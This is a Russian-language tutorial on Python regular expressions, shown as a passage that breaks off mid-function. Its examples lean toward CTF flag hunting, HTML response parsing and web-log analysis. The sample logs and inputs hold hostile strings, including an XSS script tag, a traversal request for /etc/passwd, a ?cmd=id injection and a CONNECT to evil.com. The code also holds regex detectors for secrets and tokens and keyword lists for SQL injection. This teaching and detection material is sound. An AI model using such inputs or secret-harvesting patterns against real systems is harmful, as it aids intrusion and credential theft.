#### 1. Литералы (прямое совпадение)
```python
import re
pattern = r'hello'  # r'' - raw string (рекомендуется всегда использовать)
text = 'hello world'
match = re.search(pattern, text)  # Найдёт 'hello'
```

#### 2. Специальные символы (метасимволы)

| Символ | Описание | Пример |
|--------|----------|--------|
| `.` | Любой символ, кроме новой строки | `a.c` → `abc`, `a c`, `a7c` |
| `^` | Начало строки | `^Hello` → `Hello world` |
| `$` | Конец строки | `world$` → `Hello world` |
| `*` | 0 или более повторений предыдущего | `ab*c` → `ac`, `abc`, `abbc` |
| `+` | 1 или более повторений предыдущего | `ab+c` → `abc`, `abbc` (не `ac`) |
| `?` | 0 или 1 повторение предыдущего | `ab?c` → `ac`, `abc` |
| `{n}` | Ровно n повторений | `a{3}` → `aaa` |
| `{n,}` | n или более повторений | `a{2,}` → `aa`, `aaa`, ... |
| `{n,m}` | От n до m повторений | `a{2,4}` → `aa`, `aaa`, `aaaa` |
| `[...]` | Набор символов (класс) | `[aeiou]` → любой гласный |
| `[^...]` | Отрицание набора | `[^0-9]` → любой не-цифровой |
| `\|` | ИЛИ (альтернатива) | `cat\|dog` → `cat` или `dog` |
| `()` | Группировка | `(ab)+` → `ab`, `abab`, ... |
| `\` | Экранирование | `\.` → символ точки |

#### 3. Предопределённые классы символов

| Класс | Эквивалент | Описание |
|-------|------------|----------|
| `\d` | `[0-9]` | Цифра |
| `\D` | `[^0-9]` | Не цифра |
| `\s` | `[ \t\n\r\f\v]` | Пробельный символ |
| `\S` | `[^ \t\n\r\f\v]` | Не пробельный |
| `\w` | `[a-zA-Z0-9_]` | "Слово" (буква, цифра, подчёркивание) |
| `\W` | `[^a-zA-Z0-9_]` | Не "слово" |
| `\b` | | Граница слова |
| `\B` | | Не граница слова |

## 2. Детальный разбор всех функций библиотеки `re`

### Основные функции для поиска

#### `re.search(pattern, string, flags=0)`
Находит **первое** совпадение с паттерном в строке.

```python
import re

def detailed_search_examples():
    """Подробные примеры использования search"""
    
    # Базовый поиск
    text = "The price is $19.99 for product #123"
    pattern = r'\$\d+\.\d{2}'  # Цена в формате $X.XX
    match = re.search(pattern, text)
    
    if match:
        print(f"Найдено: '{match.group()}'")  # $19.99
        print(f"Начальная позиция: {match.start()}")  # 13
        print(f"Конечная позиция: {match.end()}")     # 19
        print(f"Позиции (start, end): {match.span()}") # (13, 19)
    
    # Поиск с группами
    text = "Date: 2023-12-25, Time: 14:30"
    pattern = r'Date: (\d{4})-(\d{2})-(\d{2})'
    match = re.search(pattern, text)
    
    if match:
        print(f"\nПолное совпадение: '{match.group(0)}'")  # Date: 2023-12-25
        print(f"Год: '{match.group(1)}'")  # 2023
        print(f"Месяц: '{match.group(2)}'")  # 12
        print(f"День: '{match.group(3)}'")  # 25
        print(f"Все группы: {match.groups()}")  # ('2023', '12', '25')
    
    # Именованные группы
    text = "User: john_doe, Email: john@example.com"
    pattern = r'User: (?P<username>\w+), Email: (?P<email>[\w\.-]+@[\w\.-]+)'
    match = re.search(pattern, text)
    
    if match:
        print(f"\nИменованные группы:")
        print(f"Username: {match.group('username')}")  # john_doe
        print(f"Email: {match.group('email')}")        # john@example.com
        print(f"Словарь групп: {match.groupdict()}")   # {'username': 'john_doe', 'email': 'john@example.com'}
    
    # Поиск с флагами
    text = "Hello\nWORLD\npython"
    pattern = r'^[a-z]+$'  # Строка только из строчных букв
    
    # Без флагов - не найдёт (^ и $ для всей строки)
    match = re.search(pattern, text)
    print(f"\nБез флага multiline: {match}")
    
    # С флагом re.MULTILINE - найдёт 'python'
    match = re.search(pattern, text, re.MULTILINE)
    print(f"С флагом MULTILINE: '{match.group() if match else None}'")
    
    # С флагом re.IGNORECASE - игнорирует регистр
    pattern = r'WORLD'
    match = re.search(pattern, text, re.IGNORECASE)
    print(f"С флагом IGNORECASE: '{match.group() if match else None}'")

detailed_search_examples()
```

#### `re.match(pattern, string, flags=0)`
Проверяет, соответствует ли **начало строки** паттерну.

```python
def match_vs_search():
    """Сравнение match и search"""
    
    text = "123 abc 456"
    pattern = r'\d+'  # Одна или более цифр
    
    # match ищет только в начале строки
    m_match = re.match(pattern, text)
    print(f"match результат: '{m_match.group() if m_match else None}'")  # '123'
    
    # search ищет в любом месте
    m_search = re.search(pattern, text)
    print(f"search результат: '{m_search.group() if m_search else None}'")  # '123'
    
    # Если паттерн не в начале
    text2 = "abc 123 def"
    m_match2 = re.match(pattern, text2)
    print(f"\nmatch для '{text2}': {m_match2}")  # None
    
    m_search2 = re.search(pattern, text2)
    print(f"search для '{text2}': '{m_search2.group() if m_search2 else None}'")  # '123'

match_vs_search()
```

#### `re.fullmatch(pattern, string, flags=0)`
Проверяет, соответствует ли **вся строка** паттерну.

```python
def fullmatch_examples():
    """Примеры использования fullmatch"""
    
    # Проверка формата email
    email_pattern = r'[\w\.-]+@[\w\.-]+\.\w+'
    
    tests = [
        "user@example.com",      # Верно
        "user@example",          # Неверно (нет .domain)
        "invalid-email",         # Неверно
        "user@example.co.uk",    # Верно
    ]
    
    for test in tests:
        match = re.fullmatch(email_pattern, test)
        status = "✓ Валидный" if match else "✗ Невалидный"
        print(f"{test:25} -> {status}")
    
    # Проверка формата флага CTF
    ctf_pattern = r'CTF\{[a-zA-Z0-9_!@#$%^&*()\-+= ]+\}'
    
    ctf_tests = [
        "CTF{simple_flag}",
        "CTF{flag_with_underscore}",
        "CTF{flag-with-dash}",
        "CTF{flag with spaces}",
        "CTF{flag!@#$%}",
        "invalid_flag",
        "CTF{no_closing_brace",
    ]
    
    print("\nПроверка флагов CTF:")
    for test in ctf_tests:
        match = re.fullmatch(ctf_pattern, test)
        status = "✓ Правильный формат" if match else "✗ Неправильный формат"
        print(f"{test:30} -> {status}")

fullmatch_examples()
```

### Функции для поиска всех совпадений

#### `re.findall(pattern, string, flags=0)`
Возвращает **список всех совпадений**.

```python
def findall_examples():
    """Примеры использования findall"""
    
    # Поиск всех чисел
    text = "Prices: $19.99, $29.50, $5.00, $100"
    pattern = r'\$\d+(?:\.\d{2})?'  # $ с числами, опционально .XX
    
    prices = re.findall(pattern, text)
    print(f"Все цены: {prices}")  # ['$19.99', '$29.50', '$5.00', '$100']
    
    # С группами - возвращает только группы
    text = "Имя: Иван, Возраст: 25; Имя: Мария, Возраст: 30"
    pattern = r'Имя: (\w+), Возраст: (\d+)'
    
    matches = re.findall(pattern, text)
    print(f"\nИмена и возраст: {matches}")  # [('Иван', '25'), ('Мария', '30')]
    
    # Поиск всех флагов CTF в тексте
    ctf_text = """
    Вот несколько флагов:
    Первый: CTF{first_flag_here}
    Второй: FLAG{another_one}
    Третий: ctf{lowercase_flag}
    Не флаг: CTF{no-closing-brace
    Фейк: FLAG{}
    Ещё: CTF{special_chars!@#}
    """
    
    # Жадный поиск (может захватить лишнее)
    greedy_pattern = r'[Cc][Tt][Ff]|FLAG\{.*\}'
    greedy_flags = re.findall(greedy_pattern, ctf_text, re.IGNORECASE)
    print(f"\nЖадный поиск: {greedy_flags}")
    
    # Ленивый поиск (более точный)
    lazy_pattern = r'(?:CTF|FLAG|ctf|flag)\{[^}]*\}'
    lazy_flags = re.findall(lazy_pattern, ctf_text, re.IGNORECASE)
    print(f"Ленивый поиск: {lazy_flags}")
    
    # Поиск всех IP-адресов
    log_data = """
    192.168.1.1 - - [01/Jan/2023:00:00:01] "GET /index.html"
    10.0.0.5 - - [01/Jan/2023:00:00:02] "POST /login"
    256.300.400.500 - - [01/Jan/2023:00:00:03] "Invalid IP"
    172.16.254.1 - - [01/Jan/2023:00:00:04] "GET /admin"
    """
    
    # Простой паттерн для IP (не идеальный, но для примера)
    ip_pattern = r'\b(?:\d{1,3}\.){3}\d{1,3}\b'
    ips = re.findall(ip_pattern, log_data)
    print(f"\nНайденные IP: {ips}")
    
    # Более точный паттерн для IP
    better_ip_pattern = r'\b(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.' \
                        r'(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.' \
                        r'(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.' \
                        r'(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\b'
    
    valid_ips = re.findall(better_ip_pattern, log_data)
    print(f"Валидные IP: {valid_ips}")

findall_examples()
```

#### `re.finditer(pattern, string, flags=0)`
Возвращает **итератор объектов match** для каждого совпадения.

```python
def finditer_examples():
    """Примеры использования finditer"""
    
    text = "CTF{flag1} and FLAG{flag2} and ctf{flag3} and flag{flag4}"
    pattern = r'(?P<type>CTF|FLAG|ctf|flag)\{(?P<content>[^}]+)\}'
    
    print("Найденные флаги:")
    for i, match in enumerate(re.finditer(pattern, text, re.IGNORECASE)):
        print(f"  Флаг #{i+1}:")
        print(f"    Полный текст: '{match.group()}'")
        print(f"    Тип: '{match.group('type')}'")
        print(f"    Содержимое: '{match.group('content')}'")
        print(f"    Позиция: {match.span()}")
    
    # Анализ логов с finditer
    log_data = """
    [ERROR] 2023-12-25 10:30:45 - Invalid password for user 'admin'
    [INFO] 2023-12-25 10:30:46 - User 'john' logged in
    [WARNING] 2023-12-25 10:30:47 - Multiple failed attempts for 'admin'
    [ERROR] 2023-12-25 10:30:48 - SQL injection attempt detected
    """
    
    log_pattern = r'\[(?P<level>\w+)\]\s+' \
                  r'(?P<date>\d{4}-\d{2}-\d{2})\s+' \
                  r'(?P<time>\d{2}:\d{2}:\d{2})\s+-\s+' \
                  r'(?P<message>.*)'
    
    print("\nАнализ логов:")
    for match in re.finditer(log_pattern, log_data):
        level = match.group('level')
        message = match.group('message')
        
        # Подсветка в зависимости от уровня
        if level == 'ERROR':
            print(f"🔴 [{level}] {message}")
        elif level == 'WARNING':
            print(f"🟡 [{level}] {message}")
        elif level == 'INFO':
            print(f"🟢 [{level}] {message}")
        else:
            print(f"⚪ [{level}] {message}")

finditer_examples()
```

### Функции для замены

#### `re.sub(pattern, repl, string, count=0, flags=0)`
Заменяет совпадения в строке.

```python
def sub_examples():
    """Примеры использования sub"""
    
    # Простая замена
    text = "My phone number is 123-456-7890"
    pattern = r'\d{3}-\d{3}-\d{4}'
    
    # Замена на фиксированную строку
    anonymized = re.sub(pattern, '[PHONE REDACTED]', text)
    print(f"Анонимизировано: {anonymized}")
    
    # Замена с использованием функции
    def mask_phone(match):
        phone = match.group()
        # Оставляем только последние 4 цифры
        return '***-***-' + phone[-4:]
    
    masked = re.sub(pattern, mask_phone, text)
    print(f"Замаскировано: {masked}")
    
    # Замена с использованием групп
    text = "Иван (25), Мария (30), Алексей (28)"
    pattern = r'(\w+) \((\d+)\)'
    
    # Меняем местами имя и возраст
    replaced = re.sub(pattern, r'Возраст \2: \1', text)
    print(f"Переформатировано: {replaced}")
    
    # Ограничение количества замен
    text = "a a a a a a a"
    pattern = r'a'
    
    # Заменить только первые 3 вхождения
    replaced = re.sub(pattern, 'b', text, count=3)
    print(f"Заменено 3 раза: {replaced}")
    
    # Деобфускация кода (простейший пример)
    obfuscated_code = """
    var x1 = 10;
    var y2 = 20;
    var z3 = x1 + y2;
    console.log(z3);
    """
    
    # Замена числовых суффиксов в переменных
    deobfuscated = re.sub(r'([xyz])\d+', r'\1', obfuscated_code)
    print(f"\nДеобфусцированный код:")
    print(deobfuscated)
    
    # Санитизация пользовательского ввода
    user_input = "<script>alert('XSS')</script>Hello <b>World</b>"
    
    # Удаление HTML/JS тегов (упрощённо)
    sanitized = re.sub(r'<[^>]+>', '', user_input)
    print(f"\nСанитизированный ввод: {sanitized}")

sub_examples()
```

#### `re.subn(pattern, repl, string, count=0, flags=0)`
То же, что `sub()`, но возвращает кортеж `(новая_строка, количество_замен)`.

```python
def subn_examples():
    """Примеры использования subn"""
    
    text = "cat dog cat dog cat"
    pattern = r'cat'
    
    new_text, count = re.subn(pattern, 'CAT', text)
    print(f"Новая строка: {new_text}")
    print(f"Количество замен: {count}")
    
    # Подсчёт и замена небезопасных функций в коде
    code = """
    gets(input);
    printf("%s", input);
    strcpy(dest, src);
    scanf("%s", buffer);
    """
    
    dangerous_pattern = r'\b(gets|strcpy|scanf)\b'
    
    def safe_replacement(match):
        func = match.group(1)
        return f"/* UNSAFE: {func} */ safe_{func}"
    
    safe_code, replacements = re.subn(dangerous_pattern, safe_replacement, code)
    
    print(f"\nОригинальный код:\n{code}")
    print(f"Безопасный код ({replacements} замен):\n{safe_code}")

subn_examples()
```

### Разделение строк

#### `re.split(pattern, string, maxsplit=0, flags=0)`
Разделяет строку по паттерну.

```python
def split_examples():
    """Примеры использования split"""
    
    # Разделение по нескольким разделителям
    text = "apple,banana;orange grape|melon"
    pattern = r'[,;| ]'  # Запятая, точка с запятой, вертикальная черта или пробел
    
    fruits = re.split(pattern, text)
    print(f"Фрукты: {fruits}")
    
    # Сохранение разделителей
    text = "10+20-30*40/50"
    pattern = r'([+\-*/])'  # Группа - разделитель сохраняется
    
    parts = re.split(pattern, text)
    print(f"\nРазделено с сохранением операторов: {parts}")
    
    # Разбор сложной строки
    log_line = '192.168.1.1 - - [25/Dec/2023:10:30:45 +0300] "GET /index.html HTTP/1.1" 200 1234'
    
    # Разные подходы к парсингу
    # Простой split
    simple_parts = re.split(r'\s+', log_line)
    print(f"\nПростой split: {simple_parts}")
    
    # Более точный парсинг
    log_pattern = r'(\S+)\s+(\S+)\s+(\S+)\s+\[([^\]]+)\]\s+"([^"]+)"\s+(\d+)\s+(\d+)'
    match = re.match(log_pattern, log_line)
    
    if match:
        ip, ident, user, timestamp, request, status, size = match.groups()
        print(f"\nПарсинг лога:")
        print(f"  IP: {ip}")
        print(f"  Время: {timestamp}")
        print(f"  Запрос: {request}")
        print(f"  Статус: {status}")
        print(f"  Размер: {size}")
    
    # Ограничение количества разделений
    csv_data = "a,b,c,d,e,f,g,h"
    pattern = r','
    
    # Разделить максимум на 4 части
    parts = re.split(pattern, csv_data, maxsplit=3)
    print(f"\nОграниченный split: {parts}")

split_examples()
```

### Компиляция регулярных выражений

#### `re.compile(pattern, flags=0)`
Компилирует паттерн в объект регулярного выражения для многократного использования.

```python
def compile_examples():
    """Примеры использования compile"""
    
    # Компиляция для многократного использования
    # Особенно полезно при обработке больших объёмов данных
    ip_pattern = re.compile(r'\b(?:\d{1,3}\.){3}\d{1,3}\b')
    email_pattern = re.compile(r'[\w\.-]+@[\w\.-]+\.\w+')
    ctf_pattern = re.compile(r'CTF\{[^}]+\}', re.IGNORECASE)
    
    # Тестовые данные
    test_data = [
        "User admin from 192.168.1.1 logged in",
        "Contact: john@example.com",
        "Flag: CTF{test_flag_123}",
        "Invalid IP: 999.999.999.999",
        "Email error: invalid@email",
        "Another flag: ctf{another_one}",
    ]
    
    for line in test_data:
        print(f"\nАнализ: {line}")
        
        if ip_pattern.search(line):
            print(f"  Найден IP: {ip_pattern.search(line).group()}")
        
        if email_pattern.search(line):
            print(f"  Найден email: {email_pattern.search(line).group()}")
        
        if ctf_pattern.search(line):
            print(f"  Найден флаг CTF: {ctf_pattern.search(line).group()}")
    
    # Методы скомпилированных объектов
    pattern = re.compile(r'(\d{2})/(\d{2})/(\d{4})')
    text = "Даты: 25/12/2023, 01/01/2024, 31/12/2023"
    
    print(f"\nВсе методы скомпилированного паттерна:")
    print(f"  search: {pattern.search(text).group() if pattern.search(text) else 'None'}")
    print(f"  findall: {pattern.findall(text)}")
    print(f"  finditer: {[m.group() for m in pattern.finditer(text)]}")
    
    # Замена с скомпилированным паттерном
    new_text = pattern.sub(r'\3-\2-\1', text)  # Меняем формат даты
    print(f"  sub: {new_text}")
    
    # Разделение с скомпилированным паттерном
    parts = pattern.split(text)
    print(f"  split: {parts}")

compile_examples()
```

## 3. Флаги (flags) регулярных выражений

### Все флаги и их применение

```python
def flags_examples():
    """Детальное описание всех флагов"""
    
    text = """Hello WORLD
Python ReGex
END"""
    
    patterns_tests = [
        # (pattern, description, flags)
        (r'^[a-z]+$', "Только строчные (без флагов)", 0),
        (r'^[a-z]+$', "Только строчные (MULTILINE)", re.MULTILINE),
        (r'world', "world (без флагов)", 0),
        (r'world', "world (IGNORECASE)", re.IGNORECASE),
        (r'hello.world', ". включает \\n (без флагов)", 0),
        (r'hello.world', ". включает \\n (DOTALL)", re.DOTALL),
        (r'hello world', "Пробелы в паттерне (без флагов)", 0),
        (r'hello world', "Пробелы в паттерне (VERBOSE)", re.VERBOSE),
        (r'[a-z]', "Локаль C (без флагов)", 0),
        (r'[a-z]', "Локаль системы (LOCALE)", re.LOCALE),
        (r'\w+', "Unicode (без флагов)", 0),
        (r'\w+', "Unicode (UNICODE)", re.UNICODE),
        (r'(?i)hello', "Встроенный флаг IGNORECASE", 0),
        (r'(?m)^[a-z]+$', "Встроенный флаг MULTILINE", 0),
    ]
    
    for pattern, description, flags in patterns_tests:
        try:
            match = re.search(pattern, text, flags)
            result = f"Найдено: '{match.group()}'" if match else "Не найдено"
            print(f"{description:50} -> {result}")
        except Exception as e:
            print(f"{description:50} -> Ошибка: {e}")
    
    # Комбинирование флагов
    print("\nКомбинирование флагов:")
    combined_flags = re.IGNORECASE | re.MULTILINE | re.DOTALL
    pattern = r'^[a-z].*end$'
    
    match = re.search(pattern, text, combined_flags)
    print(f"IGNORECASE | MULTILINE | DOTALL: '{match.group() if match else None}'")
    
    # VERBOSE флаг для сложных паттернов
    print("\nVERBOSE флаг для читаемых паттернов:")
    
    # Без VERBOSE
    email_pattern_compact = r'^[\w\.-]+@[\w\.-]+\.\w+$'
    
    # С VERBOSE
    email_pattern_verbose = re.compile(r"""
        ^                   # Начало строки
        [\w\.-]+           # Имя пользователя (буквы, цифры, ., -)
        @                  # Символ @
        [\w\.-]+           # Домен (буквы, цифры, ., -)
        \.                 # Точка
        \w+                # Верхнеуровневый домен (com, org, и т.д.)
        $                  # Конец строки
    """, re.VERBOSE)
    
    test_emails = ["user@example.com", "invalid-email", "name@domain.co.uk"]
    
    for email in test_emails:
        match_compact = re.match(email_pattern_compact, email)
        match_verbose = email_pattern_verbose.match(email)
        
        status = "✓" if match_compact else "✗"
        print(f"{email:25} {status} (компактный) | {status} (verbose)")

flags_examples()
```

## 4. Продвинутые техники для CTF и ИБ

### Поиск флагов в различных форматах

```python
def find_flags_in_data():
    """Поиск флагов разных форматов в данных"""
    
    # Тестовые данные с разными форматами флагов
    test_data = """
    CTF Challenge Data:
    
    Стандартные флаги:
    Флаг 1: CTF{base_flag}
    Флаг 2: FLAG{another_flag}
    Флаг 3: flag{lowercase_flag}
    Флаг 4: ctf{mixed_case_CTF}
    
    Альтернативные форматы:
    Флаг 5: [FLAG: secret_value]
    Флаг 6: <!-- flag: hidden_in_html -->
    Флаг 7: KEY: RkFHS0VZ (base64 encoded)
    Флаг 8: 0x464c4147 (hex for FLAG)
    
    В файлах конфигурации:
    Флаг 9: password = "sup3r_s3cr3t_123"
    Флаг 10: api_key = "AKIAIOSFODNN7EXAMPLE"
    
    В коде:
    Флаг 11: // SECRET: dGhpcyBpcyBhIHNlY3JldA==
    Флаг 12: # TODO: Remove test token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9
    
    Случайные данные, похожие на флаги:
    Не флаг: CTF{no-closing-brace
    Не флаг: FLAG{}
    Не флаг: flag_without_braces
    """
    
    # Сборник паттернов для разных форматов флагов
    flag_patterns = {
        "CTF стандартный": r'CTF\{[^}]+\}',
        "FLAG стандартный": r'FLAG\{[^}]+\}',
        "flag/ctf любой регистр": r'(?i)(?:ctf|flag)\{[^}]+\}',
        "В квадратных скобках": r'\[FLAG:[^\]]+\]',
        "В HTML комментариях": r'<!--\s*flag:[^>]+-->',
        "Base64 похожий": r'(?:[A-Za-z0-9+/]{4})*(?:[A-Za-z0-9+/]{2}==|[A-Za-z0-9+/]{3}=)?',
        "Hex похожий": r'0x[0-9a-fA-F]{8,}',
        "Пароли в конфигах": r'(?:password|api[_-]?key|secret)\s*=\s*["\']([^"\']+)["\']',
        "JWT токены": r'eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*',
        "SHA-1/256/512": r'[a-fA-F0-9]{40}|[a-fA-F0-9]{64}|[a-fA-F0-9]{128}',
        "MD5": r'[a-fA-F0-9]{32}',
    }
    
    print("Поиск флагов в данных:")
    print("=" * 60)
    
    found_flags = []
    
    for pattern_name, pattern in flag_patterns.items():
        matches = re.findall(pattern, test_data)
        if matches:
            print(f"\n{pattern_name}:")
            for match in matches[:3]:  # Показываем первые 3
                # Обрезаем длинные значения
                display = str(match)[:50] + ("..." if len(str(match)) > 50 else "")
                print(f"  - {display}")
            if len(matches) > 3:
                print(f"  ... и ещё {len(matches) - 3}")
            
            found_flags.extend(matches)
    
    # Автоматическая проверка флагов
    print("\n" + "=" * 60)
    print(f"Всего найдено потенциальных флагов: {len(found_flags)}")
    
    # Попытка автоматической декодировки
    print("\nАвтоматический анализ найденного:")
    
    for i, flag in enumerate(found_flags[:5], 1):  # Первые 5
        print(f"\n#{i}: {flag[:30]}{'...' if len(flag) > 30 else ''}")
        
        # Проверка на base64
        import base64
        try:
            decoded = base64.b64decode(flag + '=' * (-len(flag) % 4)).decode('utf-8', errors='ignore')
            if len(decoded) > 3 and any(c.isprintable() for c in decoded):
                print(f"  Base64 декодировано: {decoded[:30]}...")
        except:
            pass
        
        # Проверка на hex
        if flag.startswith('0x'):
            try:
                hex_str = flag[2:]
                if all(c in '0123456789abcdefABCDEF' for c in hex_str):
                    decoded = bytes.fromhex(hex_str).decode('utf-8', errors='ignore')
                    if len(decoded) > 0:
                        print(f"  Hex декодировано: {decoded[:30]}...")
            except:
                pass

find_flags_in_data()
```

### Парсинг HTML/ответов сервера

```python
def parse_html_responses():
    """Парсинг HTML и ответов веб-сервера для CTF"""
    
    # Пример HTML ответа (типичный для веб-задач CTF)
    html_response = """
    <!DOCTYPE html>
    <html>
    <head>
        <title>CTF Challenge - Admin Panel</title>
        <meta name="description" content="Secret: CTF{meta_secret_flag}">
    </head>
    <body>
        <h1>Admin Panel</h1>
        
        <!-- DEBUG INFO: Token valid until 2023-12-31 -->
        <input type="hidden" id="csrf_token" value="a1b2c3d4e5f6">
        <input type="hidden" name="session_id" value="sess_789012345">
        
        <div class="content">
            <p>Welcome, admin!</p>
            <p>Flag: <span id="flag_display">CTF{html_flag_here}</span></p>
            
            <script>
                // API ключ для внутреннего использования
                const API_KEY = "sk_live_1234567890abcdef";
                
                // JWT токен
                const userToken = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c";
                
                function checkFlag(flag) {
                    // Флаг для проверки: CTF{js_flag_inside}
                    return flag === "CTF{js_flag_inside}";
                }
            </script>
            
            <!-- TODO: Remove debug endpoint /debug?token=debug_token_123 -->
            
            <form action="/login" method="POST">
                <input type="text" name="username" value="admin">
                <input type="password" name="password" value="SuperSecretPassword123!">
                <button type="submit">Login</button>
            </form>
            
            <a href="/download?file=secret.zip">Download secret file</a>
            
            <!-- Google Analytics -->
            <script>
                ga('create', 'UA-12345678-1', 'auto');
            </script>
        </div>
    </body>
    </html>
    """
    
    print("Анализ HTML ответа:")
    print("=" * 60)
    
    # 1. Поиск всех флагов CTF
    ctf_flags = re.findall(r'CTF\{[^}]+\}', html_response)
    print(f"\n1. Флаги CTF ({len(ctf_flags)} найдено):")
    for flag in ctf_flags:
        print(f"   - {flag}")
    
    # 2. Поиск скрытых полей (input type="hidden")
    hidden_fields = re.findall(r'<input[^>]*type=["\']hidden["\'][^>]*>', html_response)
    print(f"\n2. Скрытые поля ({len(hidden_fields)} найдено):")
    for field in hidden_fields:
        # Извлечение name и value
        name_match = re.search(r'name=["\']([^"\']+)["\']', field)
        value_match = re.search(r'value=["\']([^"\']+)["\']', field)
        
        name = name_match.group(1) if name_match else "No name"
        value = value_match.group(1) if value_match else "No value"
        
        print(f"   - {name}: {value[:20]}{'...' if len(value) > 20 else ''}")
    
    # 3. Поиск JavaScript переменных
    js_vars = re.findall(r'const\s+(\w+)\s*=\s*["\']([^"\']+)["\']', html_response)
    print(f"\n3. JavaScript переменные ({len(js_vars)} найдено):")
    for var_name, var_value in js_vars:
        print(f"   - {var_name}: {var_value[:30]}{'...' if len(var_value) > 30 else ''}")
    
    # 4. Поиск комментариев (часто содержат полезную информацию)
    comments = re.findall(r'<!--(.*?)-->', html_response, re.DOTALL)
    print(f"\n4. HTML комментарии ({len(comments)} найдено):")
    for i, comment in enumerate(comments, 1):
        comment = comment.strip()
        if comment:
            print(f"   #{i}: {comment[:50]}{'...' if len(comment) > 50 else ''}")
    
    # 5. Поиск URL/эндпоинтов
    urls = re.findall(r'(?:href|action|src)\s*=\s*["\']([^"\']+)["\']', html_response)
    print(f"\n5. URL и эндпоинты ({len(urls)} найдено):")
    for url in urls[:10]:  # Показываем первые 10
        print(f"   - {url}")
    
    # 6. Поиск email-ов
    emails = re.findall(r'[\w\.-]+@[\w\.-]+\.\w+', html_response)
    print(f"\n6. Email адреса ({len(emails)} найдено):")
    for email in emails:
        print(f"   - {email}")
    
    # 7. Поиск API ключей, токенов
    tokens = re.findall(r'(?:token|key|secret|password)\s*[=:]\s*["\']([^"\']+)["\']', html_response, re.IGNORECASE)
    print(f"\n7. Токены и ключи ({len(tokens)} найдено):")
    for token in tokens:
        print(f"   - {token[:20]}{'...' if len(token) > 20 else ''}")
    
    # 8. Автоматический поиск интересных данных
    print(f"\n8. Автоматический поиск интересных данных:")
    
    # JWT токены
    jwt_tokens = re.findall(r'eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*', html_response)
    if jwt_tokens:
        print(f"   JWT токены: {len(jwt_tokens)} найдено")
    
    # Base64 строки (длинные)
    base64_strings = re.findall(r'(?:[A-Za-z0-9+/]{4})*(?:[A-Za-z0-9+/]{2}==|[A-Za-z0-9+/]{3}=)?', html_response)
    long_base64 = [s for s in base64_strings if len(s) >= 20]
    if long_base64:
        print(f"   Длинные Base64 строки: {len(long_base64)} найдено")
    
    # Hex строки
    hex_strings = re.findall(r'[0-9a-fA-F]{16,}', html_response)
    if hex_strings:
        print(f"   Длинные Hex строки: {len(hex_strings)} найдено")

parse_html_responses()
```

### Анализ сетевых дампов и логов

```python
def analyze_network_dumps():
    """Анализ сетевых дампов и логов для CTF"""
    
    # Пример данных сетевого дампа (упрощённо)
    network_dump = """
    192.168.1.100 - - [25/Dec/2023:10:30:45 +0300] "GET /index.html HTTP/1.1" 200 1234
    192.168.1.101 - - [25/Dec/2023:10:30:46 +0300] "POST /login HTTP/1.1" 200 567 "username=admin&password=CTF{password_in_log}"
    192.168.1.102 - - [25/Dec/2023:10:30:47 +0300] "GET /flag.txt HTTP/1.1" 403 234
    192.168.1.100 - - [25/Dec/2023:10:30:48 +0300] "GET /secret/../flag HTTP/1.1" 200 45 "CTF{path_traversal_flag}"
    192.168.1.105 - - [25/Dec/2023:10:30:49 +0300] "GET /admin?token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9 HTTP/1.1" 200 678
    192.168.1.106 - - [25/Dec/2023:10:30:50 +0300] "POST /api/data HTTP/1.1" 200 901 "{\"key\": \"value\", \"flag\": \"CTF{json_flag}\"}"
    192.168.1.107 - - [25/Dec/2023:10:30:51 +0300] "GET /robots.txt HTTP/1.1" 200 123 "User-agent: *\nDisallow: /admin/\nAllow: /flag.txt # CTF{robots_flag}"
    192.168.1.108 - - [25/Dec/2023:10:30:52 +0300] "GET /%2e%2e%2fetc%2fpasswd HTTP/1.1" 200 789
    192.168.1.109 - - [25/Dec/2023:10:30:53 +0300] "GET /?cmd=id HTTP/1.1" 200 234 "CTF{command_injection}"
    10.0.0.1 - - [25/Dec/2023:10:30:54 +0300] "GET / HTTP/1.1" 200 456 "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
    192.168.1.110 - - [25/Dec/2023:10:30:55 +0300] "CONNECT evil.com:443 HTTP/1.1" 200 123
    """
    
    print("Анализ сетевого дампа:")
    print("=" * 60)
    
    # Шаблон для парсинга логов Apache/Nginx
    log_pattern = re.compile(
        r'(?P<ip>\S+)\s+'                     # IP адрес
        r'(?P<ident>\S+)\s+'                  # Идентификатор (обычно -)
        r'(?P<user>\S+)\s+'                   # Пользователь (обычно -)
        r'\[(?P<timestamp>[^\]]+)\]\s+'       # Временная метка
        r'"(?P<request>[^"]*)"\s+'            # HTTP запрос
        r'(?P<status>\d+)\s+'                 # Статус код
        r'(?P<size>\d+)\s*'                   # Размер ответа
        r'(?:\"(?P<user_agent>[^"]*)\")?'     # User Agent (опционально)
    )
    
    suspicious_requests = []
    found_flags = []
    
    print("\nПодозрительная активность:")
    
    for match in log_pattern.finditer(network_dump):
        ip = match.group('ip')
        request = match.group('request')
        status = match.group('status')
        user_agent = match.group('user_agent') or ""
        
        # Поиск флагов
        if 'CTF{' in request or 'CTF{' in user_agent:
            flag_match = re.search(r'CTF\{[^}]+\}', request + " " + user_agent)
            if flag_match:
                found_flags.append(flag_match.group())
        
        # Проверка на подозрительные запросы
        suspicious = False
        reason = []
        
        # 1. Попытка доступа к защищённым ресурсам
        if any(path in request for path in ['/admin', '/flag', '/secret', '/etc/passwd']):
            suspicious = True
            reason.append('Доступ к защищённым ресурсам')
        
        # 2. Попытка path traversal
        if any(traversal in request for traversal in ['../', '..%2f', '%2e%2e%2f']):
            suspicious = True
            reason.append('Path traversal')
        
        # 3. Попытка SQL инъекции (упрощённо)
        sql_keywords = ['union', 'select', 'insert', 'delete', 'update', 'drop', 'or 1=1']
        if any(keyword in request.lower() for keyword in sql_keywords):
            suspicious = True
            reason.append('Возможная SQL инъекция')
        
